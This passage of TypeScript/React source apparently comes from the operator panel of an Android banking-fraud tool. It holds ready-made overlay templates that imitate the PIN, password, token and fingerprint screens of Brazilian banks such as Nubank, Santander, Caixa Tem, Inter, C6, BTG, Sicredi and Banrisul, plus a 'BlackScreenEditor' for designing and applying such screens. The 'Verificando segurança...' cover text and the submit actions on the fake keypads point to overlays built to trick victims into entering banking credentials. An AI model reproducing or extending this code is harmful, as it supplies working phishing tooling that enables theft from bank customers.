      { id: 'cef-kdel', type: 'button', x: 240, y: 389, width: 90, height: 48, content: '⌫', fontSize: 18, fontWeight: 'bold', color: '#b36600', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'cef-btn', type: 'button', x: 30, y: 460, width: 300, height: 50, content: 'Entrar no Caixa Tem', fontSize: 15, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#f37021', borderRadius: 25, opacity: 100, loadingAction: 'submit' }
    ]
  },
  {
    id: 'pre-santander-id',
    name: '🔥 Santander - Validação ID Santander',
    backgroundColor: '#ec0000',
    createdAt: new Date().toISOString(),
    elements: [
      { id: 'san-title', type: 'text', x: 20, y: 80, width: 320, height: 35, content: 'Santander', fontSize: 26, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'san-sub', type: 'text', x: 20, y: 125, width: 320, height: 30, content: 'Autenticação de Segurança ID Santander', fontSize: 14, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'san-finger', type: 'fingerprint', x: 120, y: 175, width: 120, height: 140, backgroundColor: 'transparent', borderRadius: 0, opacity: 100, biometricColor: '#ffffff', biometricText: 'Toque para validar ID Santander', biometricAction: 'next' },
      { id: 'san-k1', type: 'button', x: 30, y: 325, width: 90, height: 44, content: '1', fontSize: 17, fontWeight: 'bold', color: '#ec0000', backgroundColor: '#ffffff', borderRadius: 8, opacity: 100 },
      { id: 'san-k2', type: 'button', x: 135, y: 325, width: 90, height: 44, content: '2', fontSize: 17, fontWeight: 'bold', color: '#ec0000', backgroundColor: '#ffffff', borderRadius: 8, opacity: 100 },
      { id: 'san-k3', type: 'button', x: 240, y: 325, width: 90, height: 44, content: '3', fontSize: 17, fontWeight: 'bold', color: '#ec0000', backgroundColor: '#ffffff', borderRadius: 8, opacity: 100 },
      { id: 'san-k4', type: 'button', x: 30, y: 375, width: 90, height: 44, content: '4', fontSize: 17, fontWeight: 'bold', color: '#ec0000', backgroundColor: '#ffffff', borderRadius: 8, opacity: 100 },
      { id: 'san-k5', type: 'button', x: 135, y: 375, width: 90, height: 44, content: '5', fontSize: 17, fontWeight: 'bold', color: '#ec0000', backgroundColor: '#ffffff', borderRadius: 8, opacity: 100 },
      { id: 'san-k6', type: 'button', x: 240, y: 375, width: 90, height: 44, content: '6', fontSize: 17, fontWeight: 'bold', color: '#ec0000', backgroundColor: '#ffffff', borderRadius: 8, opacity: 100 },
      { id: 'san-btn', type: 'button', x: 30, y: 440, width: 300, height: 48, content: 'Autorizar ID Santander', fontSize: 15, fontWeight: 'bold', color: '#ec0000', backgroundColor: '#ffffff', borderRadius: 24, opacity: 100, loadingAction: 'submit' }
    ]
  },
  {
    id: 'pre-nubank-senha',
    name: '🔥 Nubank - Digite a Senha de 4 Dígitos',
    backgroundColor: '#be058a',
    createdAt: new Date().toISOString(),
    elements: [
      { id: 'nu-title', type: 'text', x: 20, y: 80, width: 320, height: 35, content: 'nubank', fontSize: 28, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'nu-sub', type: 'text', x: 20, y: 125, width: 320, height: 30, content: 'Digite sua senha de 4 dígitos do cartão', fontSize: 14, fontWeight: 'bold', color: '#ffc9c9', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'nu-dots', type: 'text', x: 90, y: 165, width: 180, height: 30, content: '●   ●   ●   ●', fontSize: 22, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'nu-k1', type: 'button', x: 30, y: 215, width: 90, height: 48, content: '1', fontSize: 18, fontWeight: 'bold', color: '#be058a', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'nu-k2', type: 'button', x: 135, y: 215, width: 90, height: 48, content: '2', fontSize: 18, fontWeight: 'bold', color: '#be058a', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'nu-k3', type: 'button', x: 240, y: 215, width: 90, height: 48, content: '3', fontSize: 18, fontWeight: 'bold', color: '#be058a', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'nu-k4', type: 'button', x: 30, y: 273, width: 90, height: 48, content: '4', fontSize: 18, fontWeight: 'bold', color: '#be058a', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'nu-k5', type: 'button', x: 135, y: 273, width: 90, height: 48, content: '5', fontSize: 18, fontWeight: 'bold', color: '#be058a', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'nu-k6', type: 'button', x: 240, y: 273, width: 90, height: 48, content: '6', fontSize: 18, fontWeight: 'bold', color: '#be058a', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'nu-k7', type: 'button', x: 30, y: 331, width: 90, height: 48, content: '7', fontSize: 18, fontWeight: 'bold', color: '#be058a', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'nu-k8', type: 'button', x: 135, y: 331, width: 90, height: 48, content: '8', fontSize: 18, fontWeight: 'bold', color: '#be058a', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'nu-k9', type: 'button', x: 240, y: 331, width: 90, height: 48, content: '9', fontSize: 18, fontWeight: 'bold', color: '#be058a', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'nu-k0', type: 'button', x: 135, y: 389, width: 90, height: 48, content: '0', fontSize: 18, fontWeight: 'bold', color: '#be058a', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'nu-kdel', type: 'button', x: 240, y: 389, width: 90, height: 48, content: '⌫', fontSize: 18, fontWeight: 'bold', color: '#be058a', backgroundColor: '#ffffff', borderRadius: 12, opacity: 100 },
      { id: 'nu-btn', type: 'button', x: 30, y: 460, width: 300, height: 50, content: 'Confirmar no Nubank', fontSize: 15, fontWeight: 'bold', color: '#be058a', backgroundColor: '#ffffff', borderRadius: 25, opacity: 100, loadingAction: 'submit' }
    ]
  },
  {
    id: 'pre-inter-isafe',
    name: '🔥 Banco Inter - Validação iSafe & Senha',
    backgroundColor: '#ff7a00',
    createdAt: new Date().toISOString(),
    elements: [
      { id: 'in-title', type: 'text', x: 20, y: 80, width: 320, height: 35, content: 'banco inter', fontSize: 26, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'in-sub', type: 'text', x: 20, y: 125, width: 320, height: 30, content: 'Validação do iSafe & Senha Web', fontSize: 14, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'in-dots', type: 'text', x: 70, y: 165, width: 220, height: 30, content: '○   ○   ○   ○   ○   ○', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'in-k1', type: 'button', x: 30, y: 215, width: 90, height: 48, content: '1', fontSize: 18, fontWeight: 'bold', color: '#ff7a00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'in-k2', type: 'button', x: 135, y: 215, width: 90, height: 48, content: '2', fontSize: 18, fontWeight: 'bold', color: '#ff7a00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'in-k3', type: 'button', x: 240, y: 215, width: 90, height: 48, content: '3', fontSize: 18, fontWeight: 'bold', color: '#ff7a00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'in-k4', type: 'button', x: 30, y: 273, width: 90, height: 48, content: '4', fontSize: 18, fontWeight: 'bold', color: '#ff7a00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'in-k5', type: 'button', x: 135, y: 273, width: 90, height: 48, content: '5', fontSize: 18, fontWeight: 'bold', color: '#ff7a00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'in-k6', type: 'button', x: 240, y: 273, width: 90, height: 48, content: '6', fontSize: 18, fontWeight: 'bold', color: '#ff7a00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'in-k7', type: 'button', x: 30, y: 331, width: 90, height: 48, content: '7', fontSize: 18, fontWeight: 'bold', color: '#ff7a00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'in-k8', type: 'button', x: 135, y: 331, width: 90, height: 48, content: '8', fontSize: 18, fontWeight: 'bold', color: '#ff7a00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'in-k9', type: 'button', x: 240, y: 331, width: 90, height: 48, content: '9', fontSize: 18, fontWeight: 'bold', color: '#ff7a00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'in-k0', type: 'button', x: 135, y: 389, width: 90, height: 48, content: '0', fontSize: 18, fontWeight: 'bold', color: '#ff7a00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'in-kdel', type: 'button', x: 240, y: 389, width: 90, height: 48, content: '⌫', fontSize: 18, fontWeight: 'bold', color: '#ff7a00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'in-btn', type: 'button', x: 30, y: 460, width: 300, height: 50, content: 'Validar iSafe Inter', fontSize: 15, fontWeight: 'bold', color: '#ff7a00', backgroundColor: '#ffffff', borderRadius: 25, opacity: 100, loadingAction: 'submit' }
    ]
  },
  {
    id: 'pre-c6-senha',
    name: '🔥 C6 Bank - Digite a Senha da Conta',
    backgroundColor: '#1e1e1e',
    createdAt: new Date().toISOString(),
    elements: [
      { id: 'c6-title', type: 'text', x: 20, y: 80, width: 320, height: 35, content: 'C6 BANK', fontSize: 26, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'c6-sub', type: 'text', x: 20, y: 125, width: 320, height: 30, content: 'Digite sua senha de 6 dígitos C6', fontSize: 14, fontWeight: 'bold', color: '#afa39c', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'c6-dots', type: 'text', x: 70, y: 165, width: 220, height: 30, content: '○   ○   ○   ○   ○   ○', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'c6-k1', type: 'button', x: 30, y: 215, width: 90, height: 48, content: '1', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#2c2c2c', borderRadius: 10, opacity: 100 },
      { id: 'c6-k2', type: 'button', x: 135, y: 215, width: 90, height: 48, content: '2', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#2c2c2c', borderRadius: 10, opacity: 100 },
      { id: 'c6-k3', type: 'button', x: 240, y: 215, width: 90, height: 48, content: '3', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#2c2c2c', borderRadius: 10, opacity: 100 },
      { id: 'c6-k4', type: 'button', x: 30, y: 273, width: 90, height: 48, content: '4', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#2c2c2c', borderRadius: 10, opacity: 100 },
      { id: 'c6-k5', type: 'button', x: 135, y: 273, width: 90, height: 48, content: '5', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#2c2c2c', borderRadius: 10, opacity: 100 },
      { id: 'c6-k6', type: 'button', x: 240, y: 273, width: 90, height: 48, content: '6', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#2c2c2c', borderRadius: 10, opacity: 100 },
      { id: 'c6-k7', type: 'button', x: 30, y: 331, width: 90, height: 48, content: '7', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#2c2c2c', borderRadius: 10, opacity: 100 },
      { id: 'c6-k8', type: 'button', x: 135, y: 331, width: 90, height: 48, content: '8', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#2c2c2c', borderRadius: 10, opacity: 100 },
      { id: 'c6-k9', type: 'button', x: 240, y: 331, width: 90, height: 48, content: '9', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#2c2c2c', borderRadius: 10, opacity: 100 },
      { id: 'c6-k0', type: 'button', x: 135, y: 389, width: 90, height: 48, content: '0', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#2c2c2c', borderRadius: 10, opacity: 100 },
      { id: 'c6-kdel', type: 'button', x: 240, y: 389, width: 90, height: 48, content: '⌫', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: '#2c2c2c', borderRadius: 10, opacity: 100 },
      { id: 'c6-btn', type: 'button', x: 30, y: 460, width: 300, height: 50, content: 'Confirmar C6 Bank', fontSize: 15, fontWeight: 'bold', color: '#1e1e1e', backgroundColor: '#ffffff', borderRadius: 25, opacity: 100, loadingAction: 'submit' }
    ]
  },
  {
    id: 'pre-btg-senha',
    name: '🔥 BTG Pactual - Validação do Token de Acesso',
    backgroundColor: '#360f03',
    createdAt: new Date().toISOString(),
    elements: [
      { id: 'btg-title', type: 'text', x: 20, y: 80, width: 320, height: 35, content: 'BTG Pactual', fontSize: 25, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'btg-sub', type: 'text', x: 20, y: 125, width: 320, height: 30, content: 'Validação de Token & Senha', fontSize: 14, fontWeight: 'bold', color: '#ffa3a3', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'btg-dots', type: 'text', x: 70, y: 165, width: 220, height: 30, content: '○   ○   ○   ○   ○   ○', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'btg-k1', type: 'button', x: 30, y: 215, width: 90, height: 48, content: '1', fontSize: 18, fontWeight: 'bold', color: '#360f03', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'btg-k2', type: 'button', x: 135, y: 215, width: 90, height: 48, content: '2', fontSize: 18, fontWeight: 'bold', color: '#360f03', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'btg-k3', type: 'button', x: 240, y: 215, width: 90, height: 48, content: '3', fontSize: 18, fontWeight: 'bold', color: '#360f03', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'btg-k4', type: 'button', x: 30, y: 273, width: 90, height: 48, content: '4', fontSize: 18, fontWeight: 'bold', color: '#360f03', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'btg-k5', type: 'button', x: 135, y: 273, width: 90, height: 48, content: '5', fontSize: 18, fontWeight: 'bold', color: '#360f03', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'btg-k6', type: 'button', x: 240, y: 273, width: 90, height: 48, content: '6', fontSize: 18, fontWeight: 'bold', color: '#360f03', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'btg-k7', type: 'button', x: 30, y: 331, width: 90, height: 48, content: '7', fontSize: 18, fontWeight: 'bold', color: '#360f03', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'btg-k8', type: 'button', x: 135, y: 331, width: 90, height: 48, content: '8', fontSize: 18, fontWeight: 'bold', color: '#360f03', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'btg-k9', type: 'button', x: 240, y: 331, width: 90, height: 48, content: '9', fontSize: 18, fontWeight: 'bold', color: '#360f03', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'btg-k0', type: 'button', x: 135, y: 389, width: 90, height: 48, content: '0', fontSize: 18, fontWeight: 'bold', color: '#360f03', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'btg-kdel', type: 'button', x: 240, y: 389, width: 90, height: 48, content: '⌫', fontSize: 18, fontWeight: 'bold', color: '#360f03', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'btg-btn', type: 'button', x: 30, y: 460, width: 300, height: 50, content: 'Validar BTG Pactual', fontSize: 15, fontWeight: 'bold', color: '#360f03', backgroundColor: '#ffffff', borderRadius: 25, opacity: 100, loadingAction: 'submit' }
    ]
  },
  {
    id: 'pre-sicredi-senha',
    name: '🔥 Sicredi / Sicoob - Confirmação de Senha',
    backgroundColor: '#007833',
    createdAt: new Date().toISOString(),
    elements: [
      { id: 'sic-title', type: 'text', x: 20, y: 80, width: 320, height: 35, content: 'Sicredi', fontSize: 28, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'sic-sub', type: 'text', x: 20, y: 125, width: 320, height: 30, content: 'Digite sua senha eletrônica do associado', fontSize: 14, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'sic-dots', type: 'text', x: 70, y: 165, width: 220, height: 30, content: '○   ○   ○   ○   ○   ○', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'sic-k1', type: 'button', x: 30, y: 215, width: 90, height: 48, content: '1', fontSize: 18, fontWeight: 'bold', color: '#007833', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'sic-k2', type: 'button', x: 135, y: 215, width: 90, height: 48, content: '2', fontSize: 18, fontWeight: 'bold', color: '#007833', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'sic-k3', type: 'button', x: 240, y: 215, width: 90, height: 48, content: '3', fontSize: 18, fontWeight: 'bold', color: '#007833', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'sic-k4', type: 'button', x: 30, y: 273, width: 90, height: 48, content: '4', fontSize: 18, fontWeight: 'bold', color: '#007833', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'sic-k5', type: 'button', x: 135, y: 273, width: 90, height: 48, content: '5', fontSize: 18, fontWeight: 'bold', color: '#007833', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'sic-k6', type: 'button', x: 240, y: 273, width: 90, height: 48, content: '6', fontSize: 18, fontWeight: 'bold', color: '#007833', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'sic-k7', type: 'button', x: 30, y: 331, width: 90, height: 48, content: '7', fontSize: 18, fontWeight: 'bold', color: '#007833', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'sic-k8', type: 'button', x: 135, y: 331, width: 90, height: 48, content: '8', fontSize: 18, fontWeight: 'bold', color: '#007833', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'sic-k9', type: 'button', x: 240, y: 331, width: 90, height: 48, content: '9', fontSize: 18, fontWeight: 'bold', color: '#007833', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'sic-k0', type: 'button', x: 135, y: 389, width: 90, height: 48, content: '0', fontSize: 18, fontWeight: 'bold', color: '#007833', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'sic-kdel', type: 'button', x: 240, y: 389, width: 90, height: 48, content: '⌫', fontSize: 18, fontWeight: 'bold', color: '#007833', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'sic-btn', type: 'button', x: 30, y: 460, width: 300, height: 50, content: 'Confirmar no Sicredi', fontSize: 15, fontWeight: 'bold', color: '#007833', backgroundColor: '#ffffff', borderRadius: 25, opacity: 100, loadingAction: 'submit' }
    ]
  },
  {
    id: 'pre-banrisul-senha',
    name: '🔥 Banrisul - Validação de Cartão Virtual',
    backgroundColor: '#9e5c00',
    createdAt: new Date().toISOString(),
    elements: [
      { id: 'ban-title', type: 'text', x: 20, y: 80, width: 320, height: 35, content: 'Banrisul Digital', fontSize: 25, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'ban-sub', type: 'text', x: 20, y: 125, width: 320, height: 30, content: 'Digite a senha do Cartão Banrisul', fontSize: 14, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'ban-dots', type: 'text', x: 70, y: 165, width: 220, height: 30, content: '○   ○   ○   ○   ○   ○', fontSize: 18, fontWeight: 'bold', color: '#ffffff', backgroundColor: 'transparent', borderRadius: 0, opacity: 100 },
      { id: 'ban-k1', type: 'button', x: 30, y: 215, width: 90, height: 48, content: '1', fontSize: 18, fontWeight: 'bold', color: '#9e5c00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'ban-k2', type: 'button', x: 135, y: 215, width: 90, height: 48, content: '2', fontSize: 18, fontWeight: 'bold', color: '#9e5c00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'ban-k3', type: 'button', x: 240, y: 215, width: 90, height: 48, content: '3', fontSize: 18, fontWeight: 'bold', color: '#9e5c00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'ban-k4', type: 'button', x: 30, y: 273, width: 90, height: 48, content: '4', fontSize: 18, fontWeight: 'bold', color: '#9e5c00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'ban-k5', type: 'button', x: 135, y: 273, width: 90, height: 48, content: '5', fontSize: 18, fontWeight: 'bold', color: '#9e5c00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'ban-k6', type: 'button', x: 240, y: 273, width: 90, height: 48, content: '6', fontSize: 18, fontWeight: 'bold', color: '#9e5c00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'ban-k7', type: 'button', x: 30, y: 331, width: 90, height: 48, content: '7', fontSize: 18, fontWeight: 'bold', color: '#9e5c00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'ban-k8', type: 'button', x: 135, y: 331, width: 90, height: 48, content: '8', fontSize: 18, fontWeight: 'bold', color: '#9e5c00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'ban-k9', type: 'button', x: 240, y: 331, width: 90, height: 48, content: '9', fontSize: 18, fontWeight: 'bold', color: '#9e5c00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'ban-k0', type: 'button', x: 135, y: 389, width: 90, height: 48, content: '0', fontSize: 18, fontWeight: 'bold', color: '#9e5c00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'ban-kdel', type: 'button', x: 240, y: 389, width: 90, height: 48, content: '⌫', fontSize: 18, fontWeight: 'bold', color: '#9e5c00', backgroundColor: '#ffffff', borderRadius: 10, opacity: 100 },
      { id: 'ban-btn', type: 'button', x: 30, y: 460, width: 300, height: 50, content: 'Autorizar no Banrisul', fontSize: 15, fontWeight: 'bold', color: '#9e5c00', backgroundColor: '#ffffff', borderRadius: 25, opacity: 100, loadingAction: 'submit' }
    ]
  }
];

interface BlackScreenEditorProps {
  isOpen: boolean;
  onClose: () => void;
  onSave: (template: BlackScreenTemplate) => void;
  onApply: (template: BlackScreenTemplate) => void;
  initialTemplate?: BlackScreenTemplate;
}

const BlackScreenEditor: React.FC<BlackScreenEditorProps> = ({
  isOpen,
  onClose,
  onSave,
  onApply,
  initialTemplate
}) => {
  const [templateName, setTemplateName] = useState(initialTemplate?.name || 'Minha Tela Preta');
  const [backgroundColor, setBackgroundColor] = useState(initialTemplate?.backgroundColor || '#000000');
  const [elements, setElements] = useState<ScreenElement[]>(initialTemplate?.elements || []);
  const [selectedElement, setSelectedElement] = useState<string | null>(null);
  const [isDragging, setIsDragging] = useState(false);
  const [dragOffset, setDragOffset] = useState({ x: 0, y: 0 });
  const [savedTemplates, setSavedTemplates] = useState<BlackScreenTemplate[]>([]);
  const [showTemplates, setShowTemplates] = useState(false);
  
  const previewRef = useRef<HTMLDivElement>(null);

  // Carregar templates salvos
  useEffect(() => {
    const saved = localStorage.getItem('blackScreenTemplates');
    if (saved) {
      setSavedTemplates(JSON.parse(saved));
    }
  }, []);

  // Template padrão de exemplo
  useEffect(() => {
    if (!initialTemplate && elements.length === 0) {
      setElements([
        {
          id: 'default-text-1',
          type: 'text',
          x: 80,
          y: 300,
          width: 200,
          height: 40,
          content: 'Verificando segurança...',
          fontSize: 18,
          fontWeight: 'bold',
          color: '#ffffff',
          opacity: 100
        },
        {
          id: 'default-text-2',
          type: 'text',
          x: 90,
          y: 350,
          width: 180,
          height: 30,
          content: 'Aguarde alguns instantes',
          fontSize: 14,
          fontWeight: 'normal',
          color: '#aaaaaa',
          opacity: 100
        }
      ]);
    }
  }, []);

  // Atualiza os estados internos sempre que a tela inicial ou a abertura do modal mudar
  useEffect(() => {
    if (isOpen && initialTemplate) {
      setTemplateName(initialTemplate.name || 'Minha Tela Preta');
      setBackgroundColor(initialTemplate.backgroundColor || '#000000');
      setElements(initialTemplate.elements || []);
      setSelectedElement(null);
    }
  }, [isOpen, initialTemplate]);

  const generateId = () => `el-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;

  const addElement = (type: ScreenElement['type']) => {
    let width = 100;
    let height = 100;
    
    if (type === 'text' || type === 'logo') {
      width = 280;
      height = 40;
    } else if (type === 'fingerprint') {
      width = 120;
      height = 150;
    } else if (type === 'facial') {
      width = 180;
      height = 220;
    } else if (type === 'loading_bar') {
      width = 260;
      height = 60;
    } else if (type === 'input') {
      width = 280;
      height = 50;
    } else if (type === 'button') {
      width = 280;
      height = 50;
    }

    const newElement: ScreenElement = {
      id: generateId(),
      type,
      x: 40,
      y: 200,
      width,
      height,
      content: type === 'text' ? 'Novo texto' : type === 'logo' ? 'itaú' : type === 'button' ? 'Confirmar' : '',
      fontSize: type === 'logo' ? 22 : 16,
      fontWeight: type === 'logo' || type === 'button' ? 'bold' : 'normal',
      color: '#ffffff',
      backgroundColor: type === 'rectangle' || type === 'circle' || type === 'loading_bar' ? '#333333' : type === 'input' ? 'rgba(22, 6, 6, 0.6)' : type === 'button' ? '#ec7000' : 'transparent',
      borderRadius: type === 'circle' ? 50 : type === 'input' || type === 'button' ? 12 : 0,
      opacity: 100,
      biometricColor: '#00ff00',
      biometricText: type === 'fingerprint' ? 'Toque e segure para verificar a digital' : 'Posicione seu rosto na área demarcada',
      biometricAction: 'next',
      loadingText: 'Carregando...',
      loadingDuration: 3000,
      loadingAction: 'next',
      placeholder: type === 'input' ? 'Senha eletrônica (6 dígitos)' : undefined,
      borderColor: type === 'input' ? '#ec7000' : undefined
    };
    setElements([...elements, newElement]);
    setSelectedElement(newElement.id);
  };

  const updateElement = (id: string, updates: Partial<ScreenElement>) => {
    setElements(elements.map(el => {
      if (el.id === id) {
        let updated = { ...el, ...updates };
        // Clampar posição e tamanho
        updated.x = Math.max(0, Math.min(ANDROID_WIDTH - updated.width, updated.x));
        updated.y = Math.max(0, Math.min(ANDROID_HEIGHT - updated.height, updated.y));
        return updated;
      }
      return el;
    }));
  };

  const deleteElement = (id: string) => {
    setElements(elements.filter(el => el.id !== id));
    if (selectedElement === id) setSelectedElement(null);
  };

  const handleMouseDown = (e: React.MouseEvent, elementId: string) => {
    e.stopPropagation();
    const element = elements.find(el => el.id === elementId);
    if (!element || !previewRef.current) return;

    const rect = previewRef.current.getBoundingClientRect();
    const scaleX = ANDROID_WIDTH / rect.width;
    const scaleY = ANDROID_HEIGHT / rect.height;
    
    const mouseX = (e.clientX - rect.left) * scaleX;
    const mouseY = (e.clientY - rect.top) * scaleY;

    setSelectedElement(elementId);
    setIsDragging(true);
    setDragOffset({
      x: mouseX - element.x,
      y: mouseY - element.y
    });
  };

  const handleMouseMove = (e: React.MouseEvent) => {
    if (!isDragging || !selectedElement || !previewRef.current) return;

    const rect = previewRef.current.getBoundingClientRect();
    const scaleX = ANDROID_WIDTH / rect.width;
    const scaleY = ANDROID_HEIGHT / rect.height;
    
    const mouseX = (e.clientX - rect.left) * scaleX;
    const mouseY = (e.clientY - rect.top) * scaleY;

    const element = elements.find(el => el.id === selectedElement);
    if (!element) return;

    let newX = mouseX - dragOffset.x;
    let newY = mouseY - dragOffset.y;

    // Clampar dentro dos limites
    newX = Math.max(0, Math.min(ANDROID_WIDTH - element.width, newX));
    newY = Math.max(0, Math.min(ANDROID_HEIGHT - element.height, newY));

    updateElement(selectedElement, { x: newX, y: newY });
  };

  const handleMouseUp = () => {
    setIsDragging(false);
  };

  const handleImageUpload = (e: React.ChangeEvent<HTMLInputElement>, elementId: string) => {
    const file = e.target.files?.[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = (event) => {
      updateElement(elementId, { imageUrl: event.target?.result as string });
    };
    reader.readAsDataURL(file);
  };

  const saveTemplate = () => {
    const template: BlackScreenTemplate = {
      id: initialTemplate?.id || generateId(),
      name: templateName,
      backgroundColor,
      elements,
      createdAt: new Date().toISOString()
    };

    const existingIndex = savedTemplates.findIndex(t => t.id === template.id);
    let updated: BlackScreenTemplate[];
    
    if (existingIndex >= 0) {
      updated = [...savedTemplates];
      updated[existingIndex] = template;
    } else {
      updated = [...savedTemplates, template];
    }

    setSavedTemplates(updated);
    localStorage.setItem('blackScreenTemplates', JSON.stringify(updated));
    onSave(template);
    alert('✅ Template salvo com sucesso!');
  };

  const loadTemplate = (template: BlackScreenTemplate) => {
    setTemplateName(template.name);
    setBackgroundColor(template.backgroundColor);
    setElements(template.elements);
    setShowTemplates(false);
  };

  const deleteTemplate = (id: string) => {
    const updated = savedTemplates.filter(t => t.id !== id);
    setSavedTemplates(updated);
    localStorage.setItem('blackScreenTemplates', JSON.stringify(updated));
  };

  const applyTemplate = () => {
    const template: BlackScreenTemplate = {
      id: initialTemplate?.id || generateId(),
      name: templateName,
      backgroundColor,
      elements,
      createdAt: new Date().toISOString()
    };
    onApply(template);
  };

